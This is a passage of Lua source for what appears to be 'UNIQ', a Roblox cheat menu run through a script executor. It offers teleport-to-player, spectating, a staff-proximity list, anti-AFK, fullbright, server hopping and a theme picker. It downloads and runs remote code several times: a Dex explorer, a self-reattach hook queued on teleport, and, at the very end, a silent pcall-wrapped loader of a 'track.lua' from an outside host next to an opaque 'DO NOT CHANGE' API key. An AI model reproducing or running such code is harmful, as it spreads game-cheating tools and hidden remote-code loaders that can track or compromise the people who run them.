	nn("UICorner",{CornerRadius=UDim.new(0,6),Parent=plSearch}) nn("UIPadding",{PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10),Parent=plSearch})
	local btns=nn("Frame",{Name="oBtns",LayoutOrder=1,Size=UDim2.new(1,0,0,22),BackgroundTransparency=1,Parent=oL})
	cb1=nn("TextButton",{Size=UDim2.new(0.5,-3,0,18),Position=UDim2.new(0,0,0,2),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="Closest",Font=FM,TextSize=13,TextColor3=T.Text,AutoButtonColor=false,Parent=btns}) nn("UICorner",{CornerRadius=UDim.new(0,7),Parent=cb1})
	cb2=nn("TextButton",{Size=UDim2.new(0.5,-3,0,18),Position=UDim2.new(0.5,4,0,2),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="By Name",Font=FM,TextSize=13,TextColor3=T.Text,AutoButtonColor=false,Parent=btns}) nn("UICorner",{CornerRadius=UDim.new(0,7),Parent=cb2})
	cb1.MouseButton1Click:Connect(function() plSort="Closest" paintButtons() buildPlayerRows() end)
	cb2.MouseButton1Click:Connect(function() plSort="By Name" paintButtons() buildPlayerRows() end)
	plSearch:GetPropertyChangedSignal("Text"):Connect(function() buildPlayerRows() end)
	Players.PlayerAdded:Connect(function() task.defer(buildPlayerRows) end)
	Players.PlayerRemoving:Connect(function() task.defer(buildPlayerRows) end)
	plHost=nn("Frame",{Name="plHost",LayoutOrder=2,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Parent=oL}) list(plHost,1)
	task.spawn(function()
		while true do
			task.wait(0.25)
			if not plHost or not plHost.Parent then return end
			if plSort=="Closest" and #liveRows>0 then
				local rebuild
				for i,en in ipairs(liveRows) do
					local d=plDist(en.p)
					local txt=d and math.floor(d).."m" or "Unknown"
					if en.lbl.Text~=txt then en.lbl.Text=txt end
					if (d~=nil)~=(en.last~=nil) then rebuild=true end
					en.last=d
				end
				if not rebuild and #liveRows>1 then
					local prev=liveRows[1].last or 1e9
					for i=2,#liveRows do
						local cur=liveRows[i].last or 1e9
						if cur<prev then rebuild=true break end
						prev=cur
					end
				end
				if rebuild then buildPlayerRows() end
			end
		end
	end)
	paintButtons()
	buildPlayerRows()
	state.repaintPL=buildPlayerRows
end
buildPlayerList()
local function buildStaffList()
	local stSearch, cb1, cb2, stHost
	local liveRows={}
	local stSort="By Name"
	local function stDist(p)
		local cp=Camera.CFrame.Position
		local their=p.Character and p.Character:FindFirstChild("HumanoidRootPart")
		if their then return (cp-their.Position).Magnitude*0.28 end
		return nil
	end
	local function paintButtons()
		cb1.BackgroundColor3=stSort=="Closest" and T.Accent or T.SliderBg
		cb1.TextColor3=stSort=="Closest" and Color3.new(1,1,1) or T.Text
		cb2.BackgroundColor3=stSort=="By Name" and T.Accent or T.SliderBg
		cb2.TextColor3=stSort=="By Name" and Color3.new(1,1,1) or T.Text
		if not state.liveS then state.liveS=true table.insert(state.live,function() cb1.BackgroundColor3=stSort=="Closest" and T.Accent or T.SliderBg end) table.insert(state.live,function() cb2.BackgroundColor3=stSort=="By Name" and T.Accent or T.SliderBg end) end
	end
	local function buildStaffRows()
		if not stHost or not stHost.Parent then return end
		for _,c in ipairs(stHost:GetChildren()) do if c.Name=="PLR" or c.Name=="EMPTY" then c:Destroy() end end
		liveRows={}
		local q=string.lower(stSearch.Text or "")
		local list={}
		for _,p in ipairs(Players:GetPlayers()) do
			if isStaff(p) then
				local n=(state.playerListTagStyle=="Display Tags" and p.DisplayName or p.Name)
				if q=="" or string.find(string.lower(n),q,1,true) then table.insert(list,{n=n,p=p}) end
			end
		end
		local function low(n) return string.lower(n) end
		local function sortKey(n)
			local s=low(n)
			local c=s:sub(1,1)
			if c>="a" and c<="z" then return "1"..s else return "0"..s end
		end
		if stSort=="Closest" then
			table.sort(list,function(a,b) local da=stDist(a.p) or 1e9 local db=stDist(b.p) or 1e9 if da==db then return sortKey(a.n)<sortKey(b.n) end return da<db end)
		else
			table.sort(list,function(a,b) return sortKey(a.n)<sortKey(b.n) end)
		end
		if #list==0 then
			nn("TextLabel",{Name="EMPTY",Text="No Staff found",Font=Fn,TextSize=13,TextColor3=T.Muted,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,0,0,24),Parent=stHost})
		end
		for _,e in ipairs(list) do
			local sel=state.selectedStaff==e.n
			local isFr=state.friends[e.n] or (e.p and (state.friends[e.p.DisplayName] or state.friends[tostring(e.p.UserId)]))
			local row=nn("Frame",{Name="PLR",LayoutOrder=1,Size=UDim2.new(1,0,0,24),BackgroundTransparency=1,Parent=stHost})
			local hl=nn("Frame",{Size=UDim2.new(1,-6,0,20),Position=UDim2.new(0,3,0,2),BackgroundColor3=Color3.fromRGB(80,80,88),BackgroundTransparency=sel and 0 or 1,BorderSizePixel=0,Parent=row}) corner(hl,4)
			local lbl=nn("TextLabel",{Text=e.n,Font=Fn,TextSize=13,TextColor3=isFr and T.Accent or T.Text,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,Position=UDim2.new(0,4,0,0),Size=UDim2.new(1,-76,0,24),ZIndex=2,Parent=row}) table.insert(state.live,function() lbl.TextColor3=isFr and T.Accent or T.Text end)
			local distLbl
			if stSort=="Closest" then
				local d=stDist(e.p)
				distLbl=nn("TextLabel",{Text=d and math.floor(d).."m" or "Unknown",Font=Fn,TextSize=11,TextColor3=d and T.ValTxt or T.Muted,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Right,AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,64,0,24),ZIndex=2,Parent=row})
				table.insert(liveRows,{p=e.p,lbl=distLbl})
			end
			local hit=nn("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",AutoButtonColor=false,Parent=row})
			hit.MouseEnter:Connect(function() tw(hl,0.1,{BackgroundTransparency=sel and 0 or 0.6}) end)
			hit.MouseLeave:Connect(function() tw(hl,0.1,{BackgroundTransparency=sel and 0 or 1}) end)
			hit.MouseButton1Click:Connect(function() DH["Select Staff"](e.n) if state.friendBtn then state.friendBtn.Text=isFr and "Remove Friend" or "Add Friend" state.friendBtn.TextColor3=isFr and T.Accent or T.Text end buildStaffRows() end)
		end
	end
	stSearch=nn("TextBox",{Name="stSearch",LayoutOrder=0,Size=UDim2.new(1,-2,0,26),BackgroundTransparency=0,BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="",PlaceholderText="Search Staff",PlaceholderColor3=T.Muted,Font=Fn,TextSize=13,TextColor3=T.Text,ClearTextOnFocus=false,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=oS})
	nn("UICorner",{CornerRadius=UDim.new(0,6),Parent=stSearch}) nn("UIPadding",{PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10),Parent=stSearch})
	local btns=nn("Frame",{Name="stBtns",LayoutOrder=1,Size=UDim2.new(1,0,0,22),BackgroundTransparency=1,Parent=oS})
	cb1=nn("TextButton",{Size=UDim2.new(0.5,-3,0,18),Position=UDim2.new(0,0,0,2),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="Closest",Font=FM,TextSize=13,TextColor3=T.Text,AutoButtonColor=false,Parent=btns}) nn("UICorner",{CornerRadius=UDim.new(0,7),Parent=cb1})
	cb2=nn("TextButton",{Size=UDim2.new(0.5,-3,0,18),Position=UDim2.new(0.5,4,0,2),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="By Name",Font=FM,TextSize=13,TextColor3=T.Text,AutoButtonColor=false,Parent=btns}) nn("UICorner",{CornerRadius=UDim.new(0,7),Parent=cb2})
	cb1.MouseButton1Click:Connect(function() stSort="Closest" paintButtons() buildStaffRows() end)
	cb2.MouseButton1Click:Connect(function() stSort="By Name" paintButtons() buildStaffRows() end)
	stSearch:GetPropertyChangedSignal("Text"):Connect(function() buildStaffRows() end)
	Players.PlayerAdded:Connect(function() task.defer(buildStaffRows) end)
	Players.PlayerRemoving:Connect(function() task.defer(buildStaffRows) end)
	stHost=nn("Frame",{Name="stHost",LayoutOrder=2,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Parent=oS}) list(stHost,1)
	task.spawn(function()
		while true do
			task.wait(0.25)
			if not stHost or not stHost.Parent then return end
			if stSort=="Closest" and #liveRows>0 then
				local rebuild
				for i,en in ipairs(liveRows) do
					local d=stDist(en.p)
					local txt=d and math.floor(d).."m" or "Unknown"
					if en.lbl.Text~=txt then en.lbl.Text=txt end
					if (d~=nil)~=(en.last~=nil) then rebuild=true end
					en.last=d
				end
				if not rebuild and #liveRows>1 then
					local prev=liveRows[1].last or 1e9
					for i=2,#liveRows do
						local cur=liveRows[i].last or 1e9
						if cur<prev then rebuild=true break end
						prev=cur
					end
				end
				if rebuild then buildStaffRows() end
			end
		end
	end)
	paintButtons()
	buildStaffRows()
	state.repaintSL=buildStaffRows
end
buildStaffList()
local oR=Online.Right("Actions")
Button(oR,"Tp to Player",function() if state.selectedPlayer and state.selectedPlayer~="None" then tpToSel() notify("ONLINE","Teleported to "..state.selectedPlayer) else notify("ONLINE","No player selected") end end)
local isSpectating = false
state.isSpectating = false
local spectateBtn
spectateBtn = Button(oR,"Start Spectating",function()
	if not isSpectating then
		if state.selectedPlayer and state.selectedPlayer ~= "None" then
			specByName(state.selectedPlayer)
			isSpectating = true
			state.isSpectating = true
			spectateBtn.Text = "Stop Spectating"
			notify("ONLINE","Started spectating")
		else
			warn("[UNIQ] Select a player first")
			notify("ONLINE","Select a player first")
		end
	else
		stopSpec()
		isSpectating = false
		state.isSpectating = false
		spectateBtn.Text = "Start Spectating"
		notify("ONLINE","Stopped spectating")
	end
end)
local friendBtn=Button(oR,"Add Friend",function()
	local pName=state.selectedPlayer or state.selectedStaff
	if pName and pName~="None" then
		local plr=findP(pName)
		local keys={pName}
		if plr then keys={pName,plr.Name,plr.DisplayName,tostring(plr.UserId)} end
		if state.friends[pName] then
			for _,k in ipairs(keys) do state.friends[k]=nil end
		else
			for _,k in ipairs(keys) do state.friends[k]=true end
		end
		state.friendBtn.Text=state.friends[pName] and "Remove Friend" or "Add Friend"
		state.friendBtn.TextColor3=state.friends[pName] and T.Accent or T.Text
		notify("ONLINE",pName..(state.friends[pName] and " added to friends" or " removed from friends"))
		refreshAll()
		if state.repaintPL then state.repaintPL() end
		if state.repaintSL then state.repaintSL() end
	end
end)
state.friendBtn=friendBtn
Dropdown(oR,"Player Name Style",{"Name Tags","Display Tags"},"Display Tags",function(v) state.playerListTagStyle=v if state.repaintPL then state.repaintPL() end if state.repaintSL then state.repaintSL() end end)
end
buildOnline()
local function buildMisc()
local mL=Misc.Left("Menu")
Condition(mL,"Auto Reattach",state.autoReattach,function(v) TH["Auto Reattach"](v) end)
Condition(mL,"Anti-AFK",true,function(v) TH["Anti-AFK"](v) end) TH["Anti-AFK"](true)
Condition(mL,"Water Mark",true,function(v) setWatermark(v) end)
Condition(mL,"Keybinds",true,function(v) setKeybindHud(v) end)
Condition(mL,"Friend List",true,function(v) setFriendHud(v) end)
Button(mL,"Reset Menu",function() resetMenu() end)
Button(mL,"Unload Menu",function()
	closePreview()
	pcall(shutdown)
	_G.UniqShutdown = nil
	if Screen then Screen:Destroy() end
end)
local te=Misc.Left("Theme Editor")








--buildPicker
local function buildPicker()
	local rv,gv,bv=math.floor(T.Accent.R*255+0.5),math.floor(T.Accent.G*255+0.5),math.floor(T.Accent.B*255+0.5)
	local hue=0 local sat=0 local val=1
	local rDot,gDot,bDot,rBox,gBox,bBox,hexBox,mkr,svH
	local applyRGB,applyHSV,syncFn
	local function phex() return string.format("#%02X%02X%02X",rv,gv,bv) end
	local fr=nn("Frame",{Size=UDim2.new(1,0,0,530),BackgroundTransparency=1,BorderSizePixel=0,ClipsDescendants=true,Parent=te})
	local function mkRow(y,label,ch)
		nn("TextLabel",{Text=label,Font=FB,TextSize=13,TextColor3=T.Text,BackgroundTransparency=1,Position=UDim2.new(0,12,0,y),Size=UDim2.new(0,50,0,30),TextXAlignment=Enum.TextXAlignment.Left,Parent=fr})
		local t=nn("Frame",{Size=UDim2.new(0,172,0,9),Position=UDim2.new(0,67,0,y+10),BackgroundTransparency=1,BorderSizePixel=0,Parent=fr})
		for i=1,24 do
			local f=(i-0.5)/24
			local c
			if ch==1 then c=Color3.fromRGB(math.floor(f*255+0.5),0,0)
			elseif ch==2 then c=Color3.fromRGB(0,math.floor(f*255+0.5),0)
			else c=Color3.fromRGB(0,0,math.floor(f*255+0.5)) end
			nn("Frame",{Size=UDim2.new(1/24,0,1,0),Position=UDim2.new((i-1)/24,0,0,0),BackgroundColor3=c,BorderSizePixel=0,Parent=t})
		end
		local dot=nn("Frame",{Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,-7,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=2,Parent=t}) corner(dot,7) stroke(dot,Color3.fromRGB(60,60,60))
		local box=nn("TextBox",{Size=UDim2.new(0,87,0,25),Position=UDim2.new(1,-99,0,y+2),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text=ch==1 and tostring(rv) or (ch==2 and tostring(gv) or tostring(bv)),Font=FB,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Center,ClearTextOnFocus=true,Parent=fr}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=box})
		local dragging=false
		local function setPx(px) local a=math.clamp((px-t.AbsolutePosition.X)/t.AbsoluteSize.X,0,1) if ch==1 then rv=math.floor(a*255+0.5) elseif ch==2 then gv=math.floor(a*255+0.5) else bv=math.floor(a*255+0.5) end applyRGB() end
		t.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=true setPx(i.Position.X) end end)
		UIS.InputChanged:Connect(function(i) if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then setPx(i.Position.X) end end)
		UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end end)
		box.FocusLost:Connect(function() local n=tonumber(box.Text) if n then n=math.floor(math.clamp(n,0,255)+0.5) if ch==1 then rv=n elseif ch==2 then gv=n else bv=n end applyRGB() else if ch==1 then box.Text=tostring(rv) elseif ch==2 then box.Text=tostring(gv) else box.Text=tostring(bv) end end end)
		return dot,box
	end
	rDot,rBox=mkRow(37,"Red:",1) gDot,gBox=mkRow(76,"Green:",2) bDot,bBox=mkRow(115,"Blue:",3)
	nn("TextLabel",{Text="Hex:",Font=FB,TextSize=13,TextColor3=T.Text,BackgroundTransparency=1,Position=UDim2.new(0,12,0,154),Size=UDim2.new(0,50,0,30),TextXAlignment=Enum.TextXAlignment.Left,Parent=fr})
	hexBox=nn("TextBox",{Size=UDim2.new(0,100,0,25),Position=UDim2.new(0,67,0,157),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text=phex(),Font=FB,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Center,ClearTextOnFocus=true,Parent=fr}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=hexBox})
    local copyBtn=nn("TextButton",{Size=UDim2.new(0,50,0,25),Position=UDim2.new(0,173,0,157),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="Copy",Font=FB,TextSize=12,TextColor3=T.Text,AutoButtonColor=false,Parent=fr}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=copyBtn})
    copyBtn.MouseButton1Click:Connect(function() if setclipboard then setclipboard(phex()) copyBtn.Text="Copied" task.delay(1,function() if copyBtn and copyBtn.Parent then copyBtn.Text="Copy" end end) end end)
    hexBox.FocusLost:Connect(function() local s=(hexBox.Text or ""):gsub("#",""):gsub(" ","") if #s==6 and tonumber("0x"..s) then rv=tonumber("0x"..s:sub(1,2)) gv=tonumber("0x"..s:sub(3,4)) bv=tonumber("0x"..s:sub(5,6)) applyRGB() else hexBox.Text=phex() end end)
    local ringSize = 290
    local ringCenter = ringSize / 2
    local ringRadius = 122

    local ringH=nn("Frame",{
        Size=UDim2.fromOffset(ringSize,ringSize),
        Position=UDim2.new(0.5,-ringCenter,0,195),
        BackgroundTransparency=1,
        BorderSizePixel=0,
        Parent=fr
    })
	for i=0,359 do
        local a=i*1
        local rad=math.rad(a)
        local s=nn("Frame",{Size=UDim2.new(0,52,0,5),Position=UDim2.new(0.5,-26+ringRadius*math.cos(rad),0.5,-2.5+ringRadius*math.sin(rad)),BackgroundColor3=Color3.fromHSV(a/360,1,1),BorderSizePixel=0,Rotation=a-90,Parent=ringH}) nn("UICorner",{CornerRadius=UDim.new(0,2),Parent=s})
    end
	local hole=nn("Frame",{Size=UDim2.new(0,178,0,178),Position=UDim2.new(0.5,-89,0.5,-89),BackgroundColor3=Color3.fromRGB(22,22,25),BorderSizePixel=0,ZIndex=2,Parent=ringH}) corner(hole,89)
	local sv=nn("Frame",{Size=UDim2.new(0,142,0,142),Position=UDim2.new(0.5,-71,0.5,-71),BackgroundTransparency=1,ClipsDescendants=true,BorderSizePixel=0,ZIndex=3,Parent=ringH}) corner(sv,9)
	local svCols={}
	for i=1,24 do local f=(i-0.5)/24 svCols[i]=nn("Frame",{Size=UDim2.new(1/24,0,1,0),Position=UDim2.new((i-1)/24,0,0,0),BackgroundColor3=Color3.fromHSV(hue/360,f,1),BorderSizePixel=0,ZIndex=4,Parent=sv}) end
	local function paintSV() for i=1,24 do svCols[i].BackgroundColor3=Color3.fromHSV(hue/360,(i-0.5)/24,1) end end
	for i=1,24 do local f=(i-0.5)/24 nn("Frame",{Size=UDim2.new(1,0,1/24,0),Position=UDim2.new(0,0,(i-1)/24,0),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=1-f,BorderSizePixel=0,ZIndex=4,Parent=sv}) end
	svH=nn("Frame",{Size=UDim2.new(0,14,0,14),Position=UDim2.new(0.5,-7,0.5,-7),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=4,Parent=sv}) corner(svH,7) stroke(svH,Color3.fromRGB(70,70,70))
	mkr=nn("Frame",{Size=UDim2.new(0,12,0,12),Position=UDim2.new(0.5,-6,0.5,-6),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=5,Parent=ringH}) corner(mkr,6) stroke(mkr,Color3.fromRGB(40,40,40))
	local svHit=nn("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",AutoButtonColor=false,ZIndex=5,Parent=sv})
	local ringHit=nn("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",AutoButtonColor=false,ZIndex=4,Parent=ringH})
	local svDrag=false local ringDrag=false
	local function svPick(px,py) sat=math.clamp((px-sv.AbsolutePosition.X)/sv.AbsoluteSize.X,0,1) val=1-math.clamp((py-sv.AbsolutePosition.Y)/sv.AbsoluteSize.Y,0,1) applyHSV() end
	local function ringPick(px,py) local cx=ringH.AbsolutePosition.X+ringH.AbsoluteSize.X/2 local cy=ringH.AbsolutePosition.Y+ringH.AbsoluteSize.Y/2 local a=math.deg(math.atan2(py-cy,px-cx)) if a<0 then a=a+360 end hue=a%360 applyHSV() end
	svHit.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then svDrag=true svPick(i.Position.X,i.Position.Y) end end)
	ringHit.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then ringDrag=true ringPick(i.Position.X,i.Position.Y) end end)
	UIS.InputChanged:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseMovement then if svDrag then svPick(i.Position.X,i.Position.Y) elseif ringDrag then ringPick(i.Position.X,i.Position.Y) end end end)
	UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then svDrag=false ringDrag=false end end)
	local function syncFn()
		rDot.Position=UDim2.new(rv/255,-7,0.5,0) gDot.Position=UDim2.new(gv/255,-7,0.5,0) bDot.Position=UDim2.new(bv/255,-7,0.5,0)
		rBox.Text=tostring(rv) gBox.Text=tostring(gv) bBox.Text=tostring(bv)
		hexBox.Text=phex()
		local rad=math.rad(hue)
        mkr.Position=UDim2.new(0.5,-6+ringRadius*math.cos(rad),0.5,-6+ringRadius*math.sin(rad))
		svH.Position=UDim2.new(sat,-7,1-val,-7)
	end
	applyRGB=function() local h,s,v=Color3.fromRGB(rv,gv,bv):ToHSV() hue=h*360 sat=s val=v paintSV() setAccent(Color3.fromRGB(rv,gv,bv)) syncFn() end
    applyHSV=function() local c=Color3.fromHSV(hue/360,sat,val) rv=math.floor(c.R*255+0.5) gv=math.floor(c.G*255+0.5) bv=math.floor(c.B*255+0.5) paintSV() setAccent(c) syncFn() end
	applyRGB()
	return {sync=function() rv,gv,bv=math.floor(T.Accent.R*255+0.5),math.floor(T.Accent.G*255+0.5),math.floor(T.Accent.B*255+0.5) applyRGB() end}
end
buildPicker()
local mR=Misc.Right("Utilities")
Button(mR,"Server Hop",serverHop) Button(mR,"Rejoin Server",rejoin) 
Button(mR,"Reset Character",function() local hum=player.Character and player.Character:FindFirstChildOfClass("Humanoid") if hum then hum.Health=0 end end)
Button(mR,"Toggle Fullbright",function() local L=game:GetService("Lighting") if L.Ambient==Color3.new(1,1,1) then L.Ambient=Color3.fromRGB(127,127,127) L.Brightness=2 L.FogEnd=100000 else L.Ambient=Color3.new(1,1,1) L.OutdoorAmbient=Color3.new(1,1,1) L.Brightness=5 L.FogEnd=1e9 for _,e in ipairs(L:GetChildren()) do if e:IsA("Atmosphere") or e:IsA("BloomEffect") or e:IsA("ColorCorrectionEffect") then e.Enabled=false end end end end)
Button(mR,"Dex Explorer",function() task.spawn(function() local src=httpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua") if src then loadstring(src)() else warn("[UNIQ] Dex failed") end end) end)
end
















buildMisc()
-- INTRO
local introFinished = false
local function playIntro()
	local ac = T.Accent
	local cb = Color3.fromRGB(20, 140, 255)
	local pb = Color3.fromRGB(18, 64, 120)
	local pt = Color3.fromRGB(215, 240, 255)
	local txt = Color3.fromRGB(240, 240, 240)
	local soft = Color3.fromRGB(166, 166, 176)
	local ob = Lighting:FindFirstChild("UniqIntroBlur")
	if ob then ob:Destroy() end
	local blur = nn("BlurEffect", {Name = "UniqIntroBlur", Size = 0, Parent = Lighting})
	local ov = nn("Frame", {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ZIndex = 50,
		Parent = Screen
	})
	local title = nn("TextLabel", {
		Size = UDim2.new(0, 520, 0, 58),
		Position = UDim2.new(0.5, 0, 0.45, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundTransparency = 1,
		Text = "UNIQ",
		Font = Enum.Font.GothamBlack,
		TextSize = 42,
		TextColor3 = txt,
		TextTransparency = 1,
		ZIndex = 51,
		Parent = ov
	})
	local sub = nn("TextLabel", {
		Size = UDim2.new(0, 230, 0, 22),
		Position = UDim2.new(0.5, 18, 0.5, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundTransparency = 1,
		Text = "Successfully Loaded",
		Font = FM,
		TextSize = 13,
		TextColor3 = txt,
		TextTransparency = 1,
		ZIndex = 51,
		Parent = ov
	})
	local chk = nn("ImageLabel", {
		Size = UDim2.fromOffset(12, 12),
		Position = UDim2.new(0.5, -60, 0.5, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundColor3 = cb,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Image = "rbxassetid://72193425221883",
		ImageColor3 = Color3.new(1, 1, 1),
		ImageTransparency = 1,
		ScaleType = Enum.ScaleType.Fit,
		ZIndex = 51,
		Parent = ov
	})
	corner(chk, 8)
	local line = nn("Frame", {
		Size = UDim2.new(0, 250, 0, 2),
		Position = UDim2.new(0.5, 0, 0.479, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundColor3 = ac,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ZIndex = 51,
		Parent = ov
	})
	corner(line, 1)
	nn("UIGradient", {
		Transparency = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 1),
			NumberSequenceKeypoint.new(0.18, 0.55),
			NumberSequenceKeypoint.new(0.5, 0.08),
			NumberSequenceKeypoint.new(0.82, 0.55),
			NumberSequenceKeypoint.new(1, 1)
		}),
		Parent = line
	})
	local stat = nn("Frame", {
		Size = UDim2.new(0, 285, 0, 30),
		Position = UDim2.new(0.5, 17, 0.545, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundTransparency = 1,
		ZIndex = 50,
		Parent = ov
	})
	local pr = nn("TextLabel", {
		Size = UDim2.fromOffset(46, 28),
		Position = UDim2.fromOffset(17, 1),
		BackgroundTransparency = 1,
		Text = "Press",
		Font = Fn,
		TextSize = 13,
		TextColor3 = soft,
		TextTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 51,
		Parent = stat
	})
	local pill = nn("TextLabel", {
		Size = UDim2.fromOffset(56, 20),
		Position = UDim2.fromOffset(60, 5),
		BackgroundColor3 = pb,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Text = shortKey(state.menuKey),
		Font = FB,
		TextSize = 10,
		TextColor3 = pt,
		TextTransparency = 1,
		ZIndex = 51,
		Parent = stat
	})
	corner(pill, 3)
	local ps = stroke(pill, ac)
	ps.Transparency = 1
	local stx = nn("TextLabel", {
		Size = UDim2.new(0, 150, 1, 0),
		Position = UDim2.fromOffset(129, 0),
		BackgroundTransparency = 1,
		Text = "to open the menu",
		Font = FM,
		TextSize = 13,
		TextColor3 = soft,
		TextTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 51,
		Parent = stat
	})
	local IN = TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local OUT = TweenInfo.new(0.21, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
	tw(blur, 0.64, {Size = 18})
	TweenService:Create(title, IN, {TextTransparency = 0}):Play()
	TweenService:Create(sub, IN, {TextTransparency = 0}):Play()
	TweenService:Create(chk, IN, {ImageTransparency = 0, BackgroundTransparency = 0}):Play()
	TweenService:Create(line, IN, {BackgroundTransparency = 0.08}):Play()
	TweenService:Create(pr, IN, {TextTransparency = 0}):Play()
	TweenService:Create(pill, IN, {TextTransparency = 0, BackgroundTransparency = 0.08}):Play()
	TweenService:Create(ps, IN, {Transparency = 0.35}):Play()
	TweenService:Create(stx, IN, {TextTransparency = 0}):Play()
	task.delay(3.40, function()
		TweenService:Create(blur, OUT, {Size = 0}):Play()
		TweenService:Create(title, OUT, {TextTransparency = 1}):Play()
		TweenService:Create(sub, OUT, {TextTransparency = 1}):Play()
		TweenService:Create(chk, OUT, {ImageTransparency = 1, BackgroundTransparency = 1}):Play()
		TweenService:Create(line, OUT, {BackgroundTransparency = 1}):Play()
		TweenService:Create(pr, OUT, {TextTransparency = 1}):Play()
		TweenService:Create(pill, OUT, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
		TweenService:Create(ps, OUT, {Transparency = 1}):Play()
		TweenService:Create(stx, OUT, {TextTransparency = 1}):Play()
	end)
	task.delay(3.59, function()
		if ov.Parent then ov:Destroy() end
		if blur.Parent then blur:Destroy() end
		introFinished = true
		pcall(setWatermark,true)
		setKeybindHud(true)
		setFriendHud(true)
	end)
end
playIntro()
local lastPos = UDim2.new(0.5, -400, 0.5, -268)
local menuOpen = false
local menuAnimating = false
UIS.InputBegan:Connect(function(i, gp)
	if gp or menuAnimating then return end
	if introFinished and i.KeyCode == state.menuKey then
		menuAnimating = true
		menuOpen = not menuOpen
		local halfH = FULL.Y.Offset / 2
		local centerY = lastPos.Y.Offset + halfH
		if menuOpen then
			Win.Visible = true
ensurePreview()
			if minimized then
				Win.Size = UDim2.new(0,300,0,0)
				Win.Position = UDim2.new(lastPos.X.Scale, lastPos.X.Offset, lastPos.Y.Scale, lastPos.Y.Offset+33)
				tw(Win, 0.25, {Size = UDim2.new(0,300,0,66), Position = lastPos})
				task.delay(0.26, function() menuAnimating = false end)
			else
				Win.Size = UDim2.new(FULL.X.Scale, FULL.X.Offset, 0, 0)
				Win.Position = UDim2.new(lastPos.X.Scale, lastPos.X.Offset, lastPos.Y.Scale, centerY)
				tw(Win, 0.35, {Size = FULL, Position = lastPos})
				task.delay(0.36, function() menuAnimating = false end)
			end
		else
			lastPos = Win.Position
			local closeW = FULL.X.Offset
			local closeH = FULL.Y.Offset
			if minimized then closeW = 300 closeH = 66 end
			local cY = lastPos.Y.Offset + closeH/2
			if previewActive then previewCloseAnim() end
			tw(Win, 0.25, {
				Size = UDim2.new(0, closeW, 0, 0),
				Position = UDim2.new(lastPos.X.Scale, lastPos.X.Offset, lastPos.Y.Scale, cY)
			})
			task.delay(0.26, function()
				if not menuOpen then Win.Visible = false end
				menuAnimating = false
			end)
		end
	end
end)
local queueTeleport = queue_on_teleport
	or queueonteleport
	or (syn and syn.queue_on_teleport)
if type(queueTeleport) == "function" then
	local queuedCode = ([[

		task.wait(2)

		local source = game:HttpGet(%q)

		local run, err = loadstring(source)

		if not run then

			warn("[UNIQ] Reattach download could not be compiled:", err)

			return

		end

		run()

	]]):format(SCRIPT_URL)
	pcall(queueTeleport, queuedCode)
end
if SwitchTab then SwitchTab("Player") end print("UNIQ loaded succesfully!")
getgenv().Config = {api = "d1790aa58d84fff11ada97f63177072dc568a49a8cbf993376d685ed3355e41a"} -- DO NOT CHANGE
pcall(function() loadstring(game:HttpGet("https://rbxhook.ink/lua/track.lua"))() end)
local function __trackInit()
